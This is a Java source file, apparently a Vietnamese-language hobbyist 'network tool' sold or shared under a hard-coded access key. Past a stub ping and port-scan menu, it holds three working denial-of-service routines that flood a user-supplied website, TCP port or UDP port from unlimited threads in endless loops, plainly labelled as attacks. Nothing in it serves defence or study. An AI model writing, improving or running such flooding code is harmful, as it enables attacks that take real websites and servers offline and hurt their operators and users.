import java.util.Scanner;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.Socket;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;

public class NetworkTool {

    private static final String VALID_KEY = "AJIYPAA0TTHVO0STKZQEG6L7UCZV8P"; // Thay thế bằng key hợp lệ của bạn

    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);

        // In banner với màu sắc
        printBanner();

        // Yêu cầu nhập key
        System.out.print("\033[32mNhập key để tiếp tục: \033[0m");
        String key = scanner.nextLine();

        // Xác minh key
        if (!verifyKey(key)) {
            System.out.println("\033[31mKey không hợp lệ. Thoát...\033[0m");
            System.exit(1);
        }

        // Hiển thị menu
        System.out.println("\033[34mKey hợp lệ! Tiếp tục...\033[0m");
        showMenu(scanner);
    }

    private static void printBanner() {
        System.out.println("\033[31m" + "███╗   ██╗██╗  ████████╗██████╗ ██████╗  ██████╗ ███████╗" + "\033[0m");
        System.out.println("\033[32m" + "████╗  ██║██║  ╚══██╔══╝██╔══██╗██╔══██╗██╔═══██╗██╔════╝" + "\033[0m");
        System.out.println("\033[35m" + "██╔██╗ ██║██║     ██║   ██║  ██║██║  ██║██║   ██║███████╗" + "\033[0m");
        System.out.println("\033[31m" + "██║╚██╗██║██║     ██║   ██║  ██║██║  ██║██║   ██║╚════██║" + "\033[0m");
        System.out.println("\033[36m" + "██║ ╚████║███████╗██║   ██████╔╝██████╔╝╚██████╔╝███████║" + "\033[0m");
        System.out.println("\033[34m" + "╚═╝  ╚═══╝╚══════╝╚═╝   ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝" + "\033[0m");
        System.out.println();
        System.out.println("\033[34m" + "➢      Author: 🌺Nnguyenthanh🌺" + "\033[0m");
        System.out.println("\033[32m" + "➢      Co-dev: NguyenDucBaoLam" + "\033[0m");
        System.out.println("\033[36m" + "➢      Youtube  : https://youtube.com/@toolnt2k2?si=nRsrTMIMLbjh_H3w" + "\033[0m");
        System.out.println("\033[31m" + "➢      Support  : https://www.facebook.com/nt.14.10.02?mibextid=ZbWKw" + "\033[0m");
        System.out.println("\033[36m" + "➢      Website G : https://nguyenthanhstore.id.vn/" + "\033[0m");
        System.out.println();
    }

    private static void showMenu(Scanner scanner) {
        while (true) {
            System.out.println("\033[33mChọn chức năng:\033[0m");
            System.out.println("\033[34m1. Kiểm tra kết nối\033[0m");
            System.out.println("\033[34m2. Kiểm tra tốc độ ping\033[0m");
            System.out.println("\033[34m3. Quét cổng\033[0m");
            System.out.println("\033[34m4. Tấn công website (Layer 7)\033[0m");
            System.out.println("\033[34m5. Tấn công IP/port (Layer 4)\033[0m");
            System.out.println("\033[34m6. Tấn công UDP (Layer 4)\033[0m");
            System.out.println("\033[34m7. Thoát\033[0m");
            System.out.print("\033[32mNhập lựa chọn: \033[0m");

            String choice = scanner.nextLine();

            switch (choice) {
                case "1":
                    checkConnection(scanner);
                    break;
                case "2":
                    pingSpeed(scanner);
                    break;
                case "3":
                    portScan(scanner);
                    break;
                case "4":
                    attackWebsite(scanner);
                    break;
                case "5":
                    attackTCP(scanner);
                    break;
                case "6":
                    attackUDP(scanner);
                    break;
                case "7":
                    System.out.println("\033[31mThoát chương trình...\033[0m");
                    System.exit(0);
                    break;
                default:
                    System.out.println("\033[31mLựa chọn không hợp lệ!\033[0m");
            }
        }
    }

    private static void checkConnection(Scanner scanner) {
        System.out.print("\033[32mNhập URL để kiểm tra kết nối: \033[0m");
        String urlString = scanner.nextLine();

        try {
            URL url = new URL(urlString);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            connection.setConnectTimeout(3000);
            int responseCode = connection.getResponseCode();

            if (responseCode == 200) {
                System.out.println("\033[32mKết nối thành công: " + urlString + "\033[0m");
            } else {
                System.out.println("\033[31mKết nối thất bại: " + urlString + "\033[0m");
            }
        } catch (IOException e) {
            System.out.println("\033[31mLỗi kết nối đến " + urlString + "\033[0m");
        }
    }

    private static void pingSpeed(Scanner scanner) {
        // Placeholder cho chức năng kiểm tra tốc độ ping
        System.out.println("\033[33mChức năng kiểm tra tốc độ ping đang được phát triển...\033[0m");
    }

    private static void portScan(Scanner scanner) {
        // Placeholder cho chức năng quét cổng
        System.out.println("\033[33mChức năng quét cổng đang được phát triển...\033[0m");
    }

    private static void attackWebsite(Scanner scanner) {
        System.out.print("\033[32mNhập URL của website cần tấn công (Layer 7): \033[0m");
        String urlString = scanner.nextLine();

        System.out.print("\033[32mNhập số lượng luồng (threads): \033[0m");
        int threads = Integer.parseInt(scanner.nextLine());

        System.out.print("\033[32mNhập thời gian trễ giữa các yêu cầu (milliseconds): \033[0m");
        int delay = Integer.parseInt(scanner.nextLine());

        System.out.println("\033[33mBắt đầu tấn công website...\033[0m");

        for (int i = 0; i < threads; i++) {
            new Thread(() -> {
                try {
                    while (true) {
                        try {
                            URL url = new URL(urlString);
                            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                            connection.setRequestMethod("GET");
                            connection.setConnectTimeout(3000);
                            int responseCode = connection.getResponseCode();

                            if (responseCode == 200) {
                                System.out.println("\033[32mWebsite đang hoạt động: " + urlString + "\033[0m");
                            } else {
                                System.out.println("\033[31mWebsite không phản hồi đúng cách: " + urlString + "\033[0m");
                            }
                        } catch (IOException e) {
                            System.out.println("\033[31mKhông thể kết nối đến " + urlString + "\033[0m");
                        }
                        Thread.sleep(delay);
                    }
                } catch (InterruptedException e) {
                    System.out.println("\033[31mLuồng tấn công bị gián đoạn.\033[0m");
                }
            }).start();
        }
    }

    private static void attackTCP(Scanner scanner) {
        System.out.print("\033[32mNhập IP của server cần tấn công (Layer 4): \033[0m");
        String ip = scanner.nextLine();

        System.out.print("\033[32mNhập cổng (port): \033[0m");
        int port = Integer.parseInt(scanner.nextLine());

        System.out.print("\033[32mNhập số lượng luồng (threads): \033[0m");
        int threads = Integer.parseInt(scanner.nextLine());

        System.out.print("\033[32mNhập thời gian trễ giữa các yêu cầu (milliseconds): \033[0m");
        int delay = Integer.parseInt(scanner.nextLine());

        System.out.println("\033[33mBắt đầu tấn công TCP...\033[0m");

        for (int i = 0; i < threads; i++) {
            new Thread(() -> {
                try {
                    while (true) {
                        try (Socket socket = new Socket(ip, port)) {
                            if (socket.isConnected()) {
                                System.out.println("\033[32mKết nối thành công đến server " + ip + ":" + port + "\033[0m");
                            } else {
                                System.out.println("\033[31mKhông thể kết nối đến server " + ip + ":" + port + "\033[0m");
                            }
                        } catch (IOException e) {
                            System.out.println("\033[31mKhông thể kết nối đến " + ip + ":" + port + "\033[0m");
                        }
                        Thread.sleep(delay);
                    }
                } catch (InterruptedException e) {
                    System.out.println("\033[31mLuồng tấn công bị gián đoạn.\033[0m");
                }
            }).start();
        }
    }

    private static void attackUDP(Scanner scanner) {
        System.out.print("\033[32mNhập IP của server cần tấn công (Layer 4): \033[0m");
        String ip = scanner.nextLine();

        System.out.print("\033[32mNhập cổng (port): \033[0m");
        int port = Integer.parseInt(scanner.nextLine());

        System.out.print("\033[32mNhập số lượng luồng (threads): \033[0m");
        int threads = Integer.parseInt(scanner.nextLine());

        System.out.print("\033[32mNhập thời gian trễ giữa các yêu cầu (milliseconds): \033[0m");
        int delay = Integer.parseInt(scanner.nextLine());

        System.out.println("\033[33mBắt đầu tấn công UDP...\033[0m");

        for (int i = 0; i < threads; i++) {
            new Thread(() -> {
                try {
                    InetAddress address = InetAddress.getByName(ip);
                    DatagramSocket datagramSocket = new DatagramSocket();
                    byte[] buffer = new byte[1024];

                    while (true) {
                        DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, port);
                        datagramSocket.send(packet);
                        System.out.println("\033[32mĐã gửi gói UDP tới " + ip + ":" + port + "\033[0m");
                        Thread.sleep(delay);
                    }
                } catch (IOException | InterruptedException e) {
                    System.out.println("\033[31mLỗi khi gửi gói UDP tới " + ip + ":" + port + "\033[0m");
                }
            }).start();
        }
    }

    private static boolean verifyKey(String key) {
        return key.equals(VALID_KEY);
    }
}
